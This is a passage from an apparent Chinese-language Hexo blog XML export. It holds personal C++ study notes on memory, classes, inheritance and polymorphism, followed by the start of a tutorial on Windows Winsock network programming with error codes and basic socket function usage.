内存</h3><blockquote><p>同C</p></blockquote><ul><li><p>内存区域</p><ul><li><p>代码区</p><blockquote><p>存放函数体的二进制代码，由操作系统进行管理。</p></blockquote></li><li><p>全局区</p><blockquote><p>存放全局变量 全局常量和静态变量。</p></blockquote></li><li><p>栈区</p><blockquote><p>由编译器自动分配释放，存放函数的参数值，局部变量，局部常量等。</p><p>（栈区函数使用完后返回的局部变量会保留一次，cout输出一次其他字符串后会被清空。）</p></blockquote></li><li><p>堆区</p><blockquote><p>由程序员分配和释放，若程序员不释放，程序结束时由操作系统回收。</p></blockquote></li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//堆区开辟数据：（指针在栈区，数据在堆区）</span></span><br><span class="line"><span class="comment">//开辟地址，初值为 num</span></span><br><span class="line">type *p = <span class="keyword">new</span> <span class="built_in">type</span>( num ) ;</span><br><span class="line"><span class="comment">//num 个 type 的地址</span></span><br><span class="line">type *p = <span class="keyword">new</span> type[ num ] ;</span><br><span class="line"></span><br><span class="line"><span class="comment">//堆区释放数据/数组</span></span><br><span class="line"><span class="keyword">delete</span> p; </span><br><span class="line"><span class="keyword">delete</span>[] p;</span><br></pre></td></tr></table></figure><hr><h2 id="三、C-高级"><a href="#三、C-高级" class="headerlink" title="三、C++高级"></a>三、C++高级</h2><h3 id="1-引用"><a href="#1-引用" class="headerlink" title="1 引用"></a>1 引用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">type &amp;alias = name; <span class="comment">//（例： int&amp; b = a; ）</span></span><br><span class="line"><span class="comment">//内部实现：指针常量（下面两个等价）</span></span><br><span class="line"><span class="type">int</span>&amp; ref = a;  <span class="comment">//ref = a;和下面注释等价</span></span><br><span class="line"><span class="type">int</span>* <span class="type">const</span> ref = &amp;a;  <span class="comment">//*ref = a ;</span></span><br></pre></td></tr></table></figure><ul><li><strong>注意</strong><ul><li>引用必须初始化，不能只有定义。（作为函数参数可以补初始化）</li><li>引用初始化后不能再修改指向对象，之后使用等于是赋值。（包括地址指向）</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数引用传递（传原名，相当于取别名后传递，会影响原数据）</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span> <span class="params">( <span class="type">int</span>&amp; a , <span class="type">int</span>&amp; b )</span></span>;</span><br><span class="line"><span class="comment">//返回值可以是引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//有趣案例：</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">static</span> <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">int</span>&amp; ref = <span class="built_in">fun</span>();</span><br><span class="line">        <span class="built_in">fun</span>() = <span class="number">1000</span>;</span><br><span class="line">        std::cout &lt;&lt; ref &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印值为1000。</span></span><br></pre></td></tr></table></figure><h3 id="2-类与对象"><a href="#2-类与对象" class="headerlink" title="2 类与对象"></a>2 类与对象</h3><h4 id="2-1-封装"><a href="#2-1-封装" class="headerlink" title="2.1 封装"></a>2.1 封装</h4><blockquote><p>class name { access : type / function }; ： class 类名 { 访问权限 : 属性 / 方法 } ;（不用于C#，一个访问权限会影响后面所有的属性和方法）</p><p>class_name : : function：class_name.function，直接使用类的方法，不实例化。</p></blockquote><ul><li>访问权限（类内属性方法默认私有，结构体内属性方法默认公有）<ul><li>public：类内可以访问，类外可以访问。</li><li>private：类内可以访问，类外不可以访问。不可以被继承。</li><li>protected：类内可以访问，类外不可以访问。可以被继承。</li></ul></li></ul><blockquote><p>类的拆分：<br>头文件：保留类名和函数名。<br>主文件：类的具体实现。（不用留下类名，而是在包含头文件后 class_name : : function 即可，相当于直接用类的属性或方法）</p><p>浅拷贝：简单的复制拷贝（指针则是复制地址）。<br>深拷贝：重新在堆区申请空间再进行拷贝。</p></blockquote><h4 id="2-2-对象特征"><a href="#2-2-对象特征" class="headerlink" title="2.2 对象特征"></a>2.2 对象特征</h4><blockquote><p>构造函数：class_name() {} ，实例化对象，可以有参数。</p><p>初始化列表： class_name() : type() , … ; （同C#，自动调用构造函数）</p><p>分类：有参和无参，普通和拷贝（ Person ( const Person &amp;p) ; ：传一个自己的引用）</p><p>拷贝构造函数使用场景：函数传局部变量，函数 return，主动拷贝。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="comment">//括号法（无参直接不写括号，不然是声明函数）</span></span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="comment">//显示法（不写实例是初始化一个匿名对象，不使用会立刻被释放。且不要匿名初始化拷贝函数，编译器会认为是对象声明（Person(p3) === Person p3 ））</span></span><br><span class="line">Person p = <span class="built_in">Person</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//隐式转换</span></span><br><span class="line">Person p4 = <span class="number">10</span> ; <span class="comment">//等价于Person p4 = Person( 10 );</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//析构函数（销毁对象，不可以有参数）</span></span><br><span class="line">~<span class="built_in">class_name</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放内存</span></span><br><span class="line"><span class="keyword">if</span> ( p != <span class="literal">NULL</span> ) &#123; <span class="keyword">delete</span> p ; p = <span class="literal">NULL</span> ; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造类先构造自身中的其他类再构造自身，析构则相反。</span></span><br></pre></td></tr></table></figure><blockquote><p>静态成员变量：类内定义（不可初始化），类外全局处（不可以在函数中）初始化（不赋值默认0），初始化例： int test : : c ; </p><p>静态成员函数：只可以访问静态变量。</p><p>内存：空对象为1B，非空对象成员变量和是多少内存就是多少，成员函数和静态成员不包含在其中（分开存储）。</p><p>this指针指向被调用的成员函数所属的对象。</p><p>return *this ; 可以返回自身（函数返回值是 class_name&amp; ）。</p><p>空指针可以访问成员函数，但是遇到 this会异常（因为指针为0） （完善函数：if( this == NULL) { return ; }）。</p><p>常函数：void add() const {} ;    //不可以改值（相当于：const Class * const this），加上 mutable 的属性则可以在常函数中修改。</p><p>常对象：const Class name ;     //只可以调用常函数。</p></blockquote><h4 id="2-3-友元"><a href="#2-3-友元" class="headerlink" title="2.3 友元"></a>2.3 友元</h4><ul><li><strong>在类外访问类内的私有属性或方法</strong><ul><li>友好函数：在类中用 friend type funtion() ; 声明类外的全局函数即可。</li><li>友好类：在类中用 friend class name ; 声明类外的其他类即可。</li><li>友好类函数：在类中用 friend type class_name : : function() ; 声明类外的其他类中的函数即可。</li></ul></li></ul><h4 id="2-4-运算符重载"><a href="#2-4-运算符重载" class="headerlink" title="2.4 运算符重载"></a>2.4 运算符重载</h4><blockquote><p>自定义的数据类型进行运算。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//操作符重载（分成员函数重载和全局函数重载，同理，但调用方式不同）。</span></span><br><span class="line">type <span class="keyword">operator</span>+() &#123;&#125;; </span><br><span class="line"><span class="comment">//左移运算符（用在 cout 输出，只能全局定义，本质就是 cout &lt;&lt; p ）</span></span><br><span class="line">type <span class="keyword">operator</span>&lt;&lt;( ostream&amp; cout , <span class="keyword">class</span>&amp; p ) &#123;&#125;; </span><br><span class="line"><span class="comment">//无限追加（此操作可以实现 cout &lt;&lt; p 后可以追加其他内容）</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;( ostream&amp; cout , <span class="keyword">class</span>&amp; p )&#123; <span class="keyword">return</span> cout; &#125;; </span><br><span class="line"></span><br><span class="line"><span class="comment">//递增运算符（前置/后置）（通过在括号中加 int 区分前置和后置）</span></span><br><span class="line">calss&amp; <span class="keyword">operator</span>++() &#123; <span class="keyword">this</span>.num ++ ; <span class="keyword">return</span> *<span class="keyword">this</span> ; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">operator</span>++( <span class="type">int</span> ) &#123; <span class="keyword">class</span> <span class="title class_">temp</span> = *<span class="keyword">this</span> ; <span class="keyword">this</span>.num++ ; <span class="keyword">return</span> temp ; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值运算符（用于深拷贝，之前类中数据存在应先释放再赋值）</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">operator</span>=( <span class="keyword">class</span>&amp; p ) &#123; <span class="keyword">return</span> *<span class="keyword">this</span> ; &#125;</span><br><span class="line"><span class="comment">//关系运算符</span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> == ( <span class="keyword">class</span>&amp; p ) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数调用运算符（仿函数）（类名当函数名用）</span></span><br><span class="line">type <span class="built_in">operator</span>( ... ) &#123; ... &#125; </span><br></pre></td></tr></table></figure><h4 id="2-5-继承"><a href="#2-5-继承" class="headerlink" title="2.5 继承"></a>2.5 继承</h4><blockquote><p>基础继承：class child: public father [ , public father … ]（class 派生类 : 继承方式 基类）</p></blockquote><ul><li><p>继承方式</p><ul><li>公共继承：public（可以访问父类公共和访问的东西，且权限不变）</li><li>保护继承：protected（可以访问父类公共和访问的东西，且权限变为受保护）</li><li>私有继承：private（可以访问父类公共和访问的东西，且权限变为私有）</li></ul></li><li><p>继承特性</p><blockquote><p>父类中所有非静态成员属性都会被继承（包括私有属性）</p><p>构造和析构：先构造父类，再构造子类。而析构相反。</p><p>子类和父类中出现同名成员：访问子类——<code>&lt;obj&gt;.&lt;name&gt;</code>，访问父类<code>&lt;obj&gt;.&lt;class&gt;::&lt;name&gt;</code></p><p>注：同名参数在子类重写后父类中依旧存在。（用 sizeof 可以发现内存大小不变，参数只是隐藏了而已）<br>（和python不同，父类中写的函数中含有 this 的话会指向父类的属性而非子类重写的属性）</p><p>注：子类出现了与父类同名的函数，则会隐藏掉所有父类的同名函数（包括重载）</p></blockquote></li><li><p>菱形继承问题</p><blockquote><p>定义：两个派生类继承了同一个基类，然后又有一个派生类继承了这两个派生类。</p></blockquote><ol><li>使用属性时通过作用域区分。</li><li>利用虚继承，在两个派生类继承方式之前加上关键字 virtual（class student : virtual public people）<br>（此时继承下来的东西为 { vbptr }（virtual base pointer：虚基类指针），直接指向第一份数据，在第三个派生生继承时就不会产生二义性）</li></ol></li></ul><h4 id="2-6-多态"><a href="#2-6-多态" class="headerlink" title="2.6 多态"></a>2.6 多态</h4><ul><li><p>分类</p><blockquote><p>静态多态：函数重载，运算符重载，复用函数名。<br>动态多态：派生类，虚函数。</p><p>静态多态的函数地址早绑定–编译阶段确定函数地址。<br>动态多态的函数地址晚绑定–运行阶段确定函数地址。</p><p>案例：cat:animal , speak( animal an )，传入cat 到 speak 中，输出的结果是 animal 的，因为是地址早绑定，编译阶段就确定了函数地址。（与 JAVA 和 C# 不同）</p><p>解决方案：父类函数前加上 virtual 变成虚函数，使其变成动态函数，运行时才会确定地址，这样 speak 函数在调用时会先找子类。</p></blockquote></li><li><p>动态多态条件</p><blockquote><ol><li>有继承关系。</li><li>子类重写父类的虚函数。</li></ol><p>原理：存在虚函数表，虚函数起始位置存在虚函数表中。子类未重写则直接继承虚函数表，若重写了则虚函数表中对应函数地址要改成子类的。</p></blockquote></li></ul><h4 id="2-7-VS-开发人员命令提示工具"><a href="#2-7-VS-开发人员命令提示工具" class="headerlink" title="2.7 VS 开发人员命令提示工具"></a>2.7 VS 开发人员命令提示工具</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:: x64 Native Tools Command Prompt <span class="keyword">for</span> VS 2022</span><br><span class="line"><span class="built_in">cd</span> &lt;path&gt;</span><br><span class="line">cl /d1 reportSingleclassLayout&lt;name&gt; &lt;name&gt;.cpp（cl ：l是字母，d1：1是数字）</span><br></pre></td></tr></table></figure><h3 id="3-模板"><a href="#3-模板" class="headerlink" title="3 模板"></a>3 模板</h3><ul><li><p>基本概念</p><blockquote><p>建立通用的模具，大大提高复用性。</p><p>函数模版（T类型须一致，必须确定T才可以使用）：<br>​template &lt; typename T &gt;<br>type function ( T a ) {} ; </p><p>使用</p><ol><li>自动推导；</li><li>显式指定 function&lt;&gt;() ; </li></ol><p>与普通函数区别</p><ol><li>普通函数可以隐式转换（例：char -&gt; int ）</li><li>函数模板自动类型推导不会隐式转换，用显式指定类型则会发生隐式转换</li></ol></blockquote></li></ul><h3 id="4-STL技术"><a href="#4-STL技术" class="headerlink" title="4 STL技术"></a>4 STL技术</h3><h3 id="5-容器"><a href="#5-容器" class="headerlink" title="5 容器"></a>5 容器</h3><ul><li><p><code>&lt;int&gt;</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//append(num)</span></span><br><span class="line"><span class="built_in">push_back</span>(num);</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、C-库"><a href="#四、C-库" class="headerlink" title="四、C++库"></a>四、C++库</h2><ul><li><p>boost</p><blockquote><p><a href="https://blog.csdn.net/Aliven888/article/details/111153535">安装</a></p><p>自定义命令行输入输出。</p></blockquote></li></ul><hr><h2 id="五、C-C-应用"><a href="#五、C-C-应用" class="headerlink" title="五、C/C++应用"></a>五、C/C++应用</h2><ul><li><a href=".\4962e50b">text::C语言Windows网络编程</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> C++ </tag>
            
            <tag> 程序语言 </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言Windows网络编程</title>
      <link href="/posts/4962e50b.html"/>
      <url>/posts/4962e50b.html</url>
      
        <content type="html"><![CDATA[<h1 id="C语言Windows网络编程"><a href="#C语言Windows网络编程" class="headerlink" title="C语言Windows网络编程"></a>C语言Windows网络编程</h1><hr><h2 id="〇、网络编程错误码"><a href="#〇、网络编程错误码" class="headerlink" title="〇、网络编程错误码"></a>〇、网络编程错误码</h2><details class="folding-tag" blue><summary> 错误码 </summary>              <div class="content">              <div class="table-container"><table><thead><tr><th>错误码</th><th>错误原因</th></tr></thead><tbody><tr><td>10045</td><td>参考的对象种类不支持尝试的操作</td></tr><tr><td>10046</td><td>协议家族尚未配置到系统中或没有它的存在迹象</td></tr><tr><td>10047</td><td>使用了与请求的协议不兼容的地址</td></tr><tr><td>10048</td><td>通常每个套接字地址 (协议/网络地址/端口)只允许使用一次</td></tr><tr><td>10049</td><td>在其上下文中，该请求的地址无效</td></tr><tr><td>10050</td><td>套接字操作遇到了一个已死的网络</td></tr><tr><td>10051</td><td>向一个无法连接的网络尝试了一个套接字操作</td></tr><tr><td>10052</td><td>当该操作在进行中，由于保持活动的操作检测到一个故障，该连接中断</td></tr><tr><td>10053</td><td>您的主机中的软件放弃了一个已建立的连接</td></tr><tr><td>10054</td><td>远程主机强迫关闭了一个现有的连接</td></tr><tr><td>10055</td><td>由于系统缓冲区空间不足或列队已满，不能执行套接字上的操作</td></tr><tr><td>10056</td><td>在一个已经连接的套接字上做了一个连接请求</td></tr><tr><td>10057</td><td>由于套接字没有连接并且 (当使用一个 sendto 调用发送数据报套接字时) 没有提供地址，发送或接收数据的请求没有被接受</td></tr><tr><td>10058</td><td>由于以前的关闭调用，套接字在那个方向已经关闭，发送或接收数据的请求没有被接受</td></tr><tr><td>10059</td><td>对某个内核对象的引用过多</td></tr><tr><td>10060</td><td>由于连接方在一段时间后没有正确的答复或连接的主机没有反应，连接尝试失败</td></tr><tr><td>10061</td><td>不能做任何连接，因为目标机器积极地拒绝它</td></tr><tr><td>10062</td><td>无法翻译名称</td></tr><tr><td>10063</td><td>名称组件或名称太长</td></tr><tr><td>10064</td><td>由于目标主机坏了，套接字操作失败</td></tr><tr><td>10065</td><td>套接字操作尝试一个无法连接的主机</td></tr><tr><td>10066</td><td>不能删除目录，除非它是空的</td></tr><tr><td>10067</td><td>一个 Windows 套接字操作可能在可以同时使用的应用程序数目上有限制</td></tr><tr><td>10068</td><td>超过限额</td></tr><tr><td>10069</td><td>超过磁盘限额</td></tr><tr><td>10070</td><td>文件句柄引用不再有效</td></tr><tr><td>10071</td><td>项目在本地不可用</td></tr><tr><td>10091</td><td>因为它使用提供网络服务的系统目前无效，WSAStartup 目前不能正常工作</td></tr><tr><td>10092</td><td>不支持请求的 Windows 套接字版本</td></tr><tr><td>10093</td><td>应用程序没有调用 WSAStartup，或者 WSAStartup 失败</td></tr><tr><td>10101</td><td>由 WSARecv 或 WSARecvFrom 返回表示远程方面已经开始了关闭步骤</td></tr><tr><td>10102</td><td>WSALookupServiceNext 不能返回更多的结果</td></tr><tr><td>10103</td><td>在处理这个调用时，就开始调用 WSALookupServiceEnd该调用被删除</td></tr><tr><td>10104</td><td>过程调用无效</td></tr><tr><td>10105</td><td>请求的服务提供程序无效</td></tr><tr><td>10106</td><td>没有加载或初始化请求的服务提供程序</td></tr><tr><td>10107</td><td>从来不应失败的系统调用失败了</td></tr><tr><td>10108</td><td>没有已知的此服务在指定的名称空间中找不这个服务</td></tr><tr><td>10109</td><td>找不到指定的类别</td></tr><tr><td>10110</td><td>WSALookupServiceNext 不能返回更多的结果</td></tr><tr><td>10111</td><td>在处理这个调用时，就开始调用 WSALookupServiceEnd该调用被删除</td></tr><tr><td>10112</td><td>由于被拒绝，数据查询失败</td></tr><tr><td>11001</td><td>不知道这样的主机</td></tr><tr><td>11002</td><td>这是在主机名解析时常出现的暂时错误，并且意味着本地服务器没有从权威服务器上收到响应</td></tr><tr><td>11003</td><td>在数据寻找中出现一个不可恢复的错误</td></tr><tr><td>11004</td><td>请求的名称有效并且是在数据库中找到，但是它没有相关的正确的数据</td></tr><tr><td>11005</td><td>至少到达了一个保留</td></tr><tr><td>11006</td><td>至少到达了一个路径</td></tr><tr><td>11007</td><td>没有发送方</td></tr><tr><td>11008</td><td>没有接受方</td></tr><tr><td>11009</td><td>保留已经确认</td></tr><tr><td>11010</td><td>错误是由于资源不足造成</td></tr><tr><td>11011</td><td>由于管理原因被拒绝 无效凭据</td></tr><tr><td>11012</td><td>未知或有冲突类型</td></tr><tr><td>11013</td><td>某一部分的 filterspec 或 providerspecific 缓冲区有问题</td></tr><tr><td>11014</td><td>flowspec 的某部分有问题</td></tr><tr><td>11015</td><td>一般性 QOS 错误</td></tr><tr><td>11016</td><td>在流程规格中发现一个无效的或不可识别的服务类型</td></tr><tr><td>11017</td><td>在 QOS 结构中发现一个无效的或不一致的流程规格</td></tr><tr><td>11018</td><td>无效的 QOS 提供程序特定缓冲区</td></tr><tr><td>11019</td><td>使用了无效的 QOS 筛选器样式</td></tr><tr><td>11020</td><td>使用了无效的 QOS 筛选器类型</td></tr><tr><td>11021</td><td>FLOWDESCRIPTOR 中指定的 QOS FILTERSPEC 数量不正确</td></tr></tbody></table></div>              </div>            </details><hr><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1-计算机网络和TCPIP协议"><a href="#1-计算机网络和TCPIP协议" class="headerlink" title="1 计算机网络和TCPIP协议"></a>1 计算机网络和TCPIP协议</h3><ul><li>五层结构</li></ul><h3 id="2-网络通信模型"><a href="#2-网络通信模型" class="headerlink" title="2 网络通信模型"></a>2 网络通信模型</h3><ul><li><p>C/S</p></li><li><p>B/S</p></li><li><p>P2P</p></li></ul><h3 id="3-网络数据传输"><a href="#3-网络数据传输" class="headerlink" title="3 网络数据传输"></a>3 网络数据传输</h3><ul><li><p>字节</p><ul><li><p>大端顺序：高字节存在内存低地址。  </p></li><li><p>小端顺序：低字节存在内存低地址。</p><blockquote><p>例如：对于0x12345678     大端： 地址0 [ 0x12 , 0x34 , 0x56 , 0x78 ] 地址31     小端： 地址0 [ 0x78 , 0x56 , 0x34 , 0x12 ] 地址31</p><p>一般情况下：网络传输用大端模式，内存存储用小端模式。（例如基于x86平台的PC机）</p></blockquote></li></ul></li><li><p>对齐</p><blockquote><p>C语言结构体存储会自动对齐。</p></blockquote></li><li><p>编码</p><blockquote><p>Base64是网络上最常见的用于传输8比特方式之一，可用于在HTTP环境下传递较长的标识信息。</p></blockquote></li></ul><h3 id="4-编程概念"><a href="#4-编程概念" class="headerlink" title="4 编程概念"></a>4 编程概念</h3><ul><li><p>接口功能</p><ul><li>基本功能<ul><li>分配用于通信的本地资源。</li><li>指定本地与远程通信端点。</li><li>（客户端）启动连接。</li><li>（服务器）等待连接到来。</li><li>发送或接收数据。</li><li>判断数据何时到来。</li><li>从容终止连接。</li></ul></li><li>辅助功能：<ul><li>产生紧急数据。</li><li>处理到来的紧急数据。</li><li>处理来自远程端点的连接终止。</li><li>异常终止通信。</li><li>处理错误条件或连接异常终止。</li><li>连接结束后释放本地资源。</li></ul></li></ul></li><li><p><a href="https://www.cnblogs.com/xiaofeifei/p/4060497.html">UNIX中的基本I/O功能</a></p><blockquote><p>内核通过文件描述符引用打开的文件，通常通过open函数或者create函数返回文件描述符。</p></blockquote></li></ul><h3 id="5-套接字"><a href="#5-套接字" class="headerlink" title="5 套接字"></a>5 套接字</h3><ul><li><p>协议</p><ul><li>PF_INET：IPv4协议簇</li><li>PF_INET6：IPv6协议簇​</li><li>PF_IPX：IPX/SPX协议簇</li><li>PF_NETBIOS：NetBIOS协议簇</li></ul></li><li><p>套接字类型</p><ul><li>SOCK_STREAM：TCP协议</li><li>SOCK_DGRAM：UDP协议</li><li>SOCK_RAW：IP协议</li></ul></li><li><p>端点地址</p><ul><li>AF_INET：IPv4地址族</li><li>AF_INET6：IPv6地址族</li><li>AF_IPX：IPX/SPX地址族</li><li>AF_NETBIOS：NetBIOS地址族</li><li>AF_UNSPEC 则意味着函数返回的是适用于指定主机名和服务名且适合任何协议族的地址。</li></ul></li><li><p>通信过程</p><ol><li>建立一个Socket。</li><li>配置Socket。</li><li>连接Socket。（可选）</li><li>通过Socket发送数据。</li><li>通过Socket接收数据。</li><li>关闭Socket。</li></ol></li></ul><h3 id="6-多线程编程"><a href="#6-多线程编程" class="headerlink" title="6 多线程编程"></a>6 多线程编程</h3><ul><li>使用<ol><li>创建线程函数。</li><li>创建线程。</li><li>激活线程。</li><li>结束线程。</li></ol></li></ul><hr><h2 id="二、函数"><a href="#二、函数" class="headerlink" title="二、函数"></a>二、函数</h2><h3 id="1-头文件"><a href="#1-头文件" class="headerlink" title="1 头文件"></a>1 头文件</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// VS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _WINSOCK_DEPRECATED_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WS2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//连接到WinSock2对应的文件:Ws2_32.lib, Mswsock.lib, Advapi32.lib</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;Mswsock.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;AdvApi32.lib&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="2-网络数据函数"><a href="#2-网络数据函数" class="headerlink" title="2 网络数据函数"></a>2 网络数据函数</h3><ul><li><p>网络与主机类型转化</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//网络变主机</span></span><br><span class="line"><span class="function">u_short WSAPPI <span class="title">ntohs</span><span class="params">(__in u_short netshort)</span></span>; <span class="comment">// u_short</span></span><br><span class="line"><span class="function">u_long WSAPPI <span class="title">ntohl</span><span class="params">(__in u_long netlong)</span></span>; <span class="comment">// u_long</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//主机变网络</span></span><br><span class="line"><span class="function">u_short WSAPPI <span class="title">htons</span><span class="params">( __in u_short hostshort)</span></span>; <span class="comment">// u_short</span></span><br><span class="line"><span class="function">u_long WSAPPI <span class="title">htonl</span><span class="params">( __in u_long hostlong)</span></span>; <span class="comment">// u_long</span></span><br></pre></td></tr></table></figure></li><li><p>对齐</p><p><code>#pragma pack([show]|[push|pop][,identifier],n);</code></p><blockquote><p><a href="https://www.jianshu.com/p/d994731f658d">#pragma pack用法</a></p><p>#pragma pack()设置的是默认对齐模数。</p></blockquote><ul><li><p>show</p><blockquote><p>可选参数，显示当前对齐的模板，以警告消息的形式显示。</p></blockquote></li><li><p>push</p><blockquote><p>对齐模数n压栈，未指定n则压入当前对齐模数。</p><p>push一般带n。</p></blockquote></li><li><p>pop</p><blockquote><p>n出栈。不带n设置出栈数为对齐模数，设置n则会出栈并设置n为对齐模数。</p><p>pop一般不带n。</p></blockquote></li><li><p>identifier</p><blockquote><p>编译器执行这条执行时会从栈顶向下顺序查找匹配的identifier，找到identifier相同的这个数之后将从栈顶到identifier，包括找到identifier全部pop弹出， 若没有找到则不进行任何操作。</p></blockquote></li><li><p>n</p><blockquote><p>对齐模数。</p></blockquote></li></ul></li><li><p>数据校验</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例</span></span><br><span class="line"><span class="comment">// 数据校验，传入数据包头和数据包头长</span></span><br><span class="line"><span class="function">u_short <span class="title">in_cksum</span><span class="params">(u_short* pchBuffer,<span class="type">int</span> iSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u_long ulCksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (iSize &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">ulCksum += *pchBuffer++;</span><br><span class="line">iSize -= <span class="built_in">sizeof</span>(u_short);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (iSize)</span><br><span class="line">       ulCksum += *(UCHAR*)pchBuffer;</span><br><span class="line">    ulCksum = (ulCksum &gt;&gt; <span class="number">16</span>) + (ulCksum &amp; <span class="number">0xffff</span>);</span><br><span class="line">    ulCksum += (ulCksum &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> (USHORT)(~ulCksum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Windows套接字函数"><a href="#3-Windows套接字函数" class="headerlink" title="3 Windows套接字函数"></a>3 Windows套接字函数</h3><ul><li><p>WSAStartup()</p><blockquote><p>Windows Sockets DLL的初始化。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义：</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSAStartup</span><span class="params">( __in WORD wVersionRequested , __out LPWSADATA lpWSAData )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wVersionRequested[in]：一个WORD（双字节）型数值，在最高版本的Windows Sockets支持调用者使用，高阶字节指定小版本(修订本)号,低位字节指定主版本号。</span></span><br><span class="line"><span class="comment">// lpWSAData[out]：指向WSADATA数据结构的指针，用来接收Windows Sockets实现的细节。</span></span><br><span class="line"><span class="comment">// 成功返回0，失败返回错误码。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用：</span></span><br><span class="line">WSADATA wsaData; </span><br><span class="line"><span class="type">int</span> iResult; </span><br><span class="line">iResult = <span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>,<span class="number">2</span>),&amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>,iResult);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>WSACleanup()</p><blockquote><p>Windows Sockets DLL的释放。</p><p>每一次WSAStartup()必须有一个对应的WSACleanup()。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">WSACleanup</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br><span class="line"><span class="comment">// 成功返回0，失败返回错误码。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="type">int</span> iResult; </span><br><span class="line">iResult = <span class="built_in">WSACleanup</span>();</span><br><span class="line"><span class="keyword">if</span> (iResult != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed with error: %d\n&quot;</span>,iResult);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span 